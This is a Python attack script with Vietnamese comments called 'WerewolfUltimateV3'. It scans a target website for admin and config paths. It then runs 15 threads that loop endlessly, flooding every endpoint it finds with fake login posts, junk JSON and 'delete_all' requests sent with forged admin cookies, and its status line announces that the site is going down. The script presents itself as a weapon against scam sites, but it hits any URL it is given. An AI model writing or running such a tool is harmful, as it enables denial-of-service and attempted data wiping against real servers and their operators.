import requests
import threading
import time
import random
import string
import sys
from colorama import Fore, init

# Khởi tạo màu sắc cho Termux
init(autoreset=True)

class WerewolfUltimateV3:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36"
        }
        self.valid_endpoints = [] 
        self.total_sent = 0

    def rand_str(self, length=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    # --- GIAI ĐOẠN 1: DÒ TÌM TỪNG DÒNG (FUZZING) ---
    def find_vulnerabilities(self):
        print(f"{Fore.YELLOW}[*] Đang dò tìm lỗ hổng ẩn (/dkkdk, /hdvdissd, /kì)...")
        # Danh sách đường dẫn thông thường và kỳ quặc
        test_paths = [
            "/admin", "/assets/ajax/data.php", "/assets/ajax/login.php", 
            "/api/member", "/config.php", "/savehack.txt", "/assets/ajax/buy_premium.php"
        ]
        # Tạo thêm 10 đường dẫn ngẫu nhiên siêu dài như yêu cầu
        for _ in range(10):
            test_paths.append("/" + self.rand_str(20))

        for p in test_paths:
            try:
                url = self.target + p
                # Kiểm tra xem cổng này có phản hồi không
                res = requests.get(url, headers=self.headers, timeout=2)
                if res.status_code < 405: 
                    print(f"{Fore.GREEN}[+] Phát hiện cửa hở tiềm năng: {p}")
                    self.valid_endpoints.append(url)
            except:
                pass

    # --- TRÁI TIM TẤN CÔNG: 4 PHƯƠNG ÁN TỔNG LỰC ---
    def attack_cycle(self):
        while True:
            for url in self.valid_endpoints:
                try:
                    # PHƯƠNG ÁN 1: Tấn công Đăng nhập + Giả lập Robot
                    login_data = {
                        "username": self.rand_str(8),
                        "password": self.rand_str(12),
                        "captcha_coord": f"{random.randint(10,200)},{random.randint(10,50)}", # Tọa độ click giả
                        "is_human": "true"
                    }
                    requests.post(url, data=login_data, headers=self.headers, timeout=1)

                    # PHƯƠNG ÁN 2: Đầu độc dữ liệu (JSON Poison)
                    json_data = {"id": random.randint(1,99999), "msg": self.rand_str(100)}
                    requests.post(url, json=json_data, headers=self.headers, timeout=1)

                    # PHƯƠNG ÁN 3 & 4: Hack Cookie & Hủy diệt Admin
                    # Thử gửi lệnh xóa sạch dữ liệu với quyền Admin giả lập
                    fake_cookie = {"PHPSESSID": self.rand_str(32), "admin_login": "true"}
                    wipe_req = requests.post(url, data={"action": "delete_all", "confirm": "yes"}, 
                                           cookies=fake_cookie, headers=self.headers, timeout=1)
                    
                    # Kiểm tra xem có dấu hiệu xóa thành công không
                    if "success" in wipe_req.text.lower() or wipe_req.status_code == 200:
                        # Đây là nơi xác nhận phôi được quyền admin
                        pass 

                    self.total_sent += 3 # Đã bắn 3 loại đạn
                except:
                    pass
            
            # GIỮ CHO MÁY MÁT, KHÔNG LAG (0.1 giây nghỉ là vàng)
            time.sleep(0.1)

    def start(self):
        self.find_vulnerabilities()
        # Nếu không tìm thấy gì, mặc định đánh vào trang chủ
        if not self.valid_endpoints:
            self.valid_endpoints.append(self.target)
        
        print(f"{Fore.CYAN}[>>>] KÍCH HOẠT TỔNG LỰC 15 LUỒNG - ĐIỆN THOẠI AN TOÀN...")
        
        # Khởi chạy 15 luồng tấn công song song
        for _ in range(15):
            t = threading.Thread(target=self.attack_logic_wrapper)
            t.daemon = True
            t.start()

        # Vòng lặp hiển thị trạng thái mượt mà
        colors = [Fore.GREEN, Fore.CYAN, Fore.MAGENTA, Fore.YELLOW]
        while True:
            c = random.choice(colors)
            sys.stdout.write(f"\r{c}[WEREWOLF]{Fore.WHITE} Đã bắn: {self.total_sent} rác | Máy: Cực mượt | Web: Đang sập...")
            sys.stdout.flush()
            time.sleep(0.5)

    def attack_logic_wrapper(self):
        # Hàm bổ trợ để chạy attack_cycle trong thread
        self.attack_cycle()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target_link = sys.argv[1]
    else:
        target_link = input(f"{Fore.WHITE}Nhập link web lừa đảo: ")
    
    bot = WerewolfUltimateV3(target_link)
    bot.start()
    
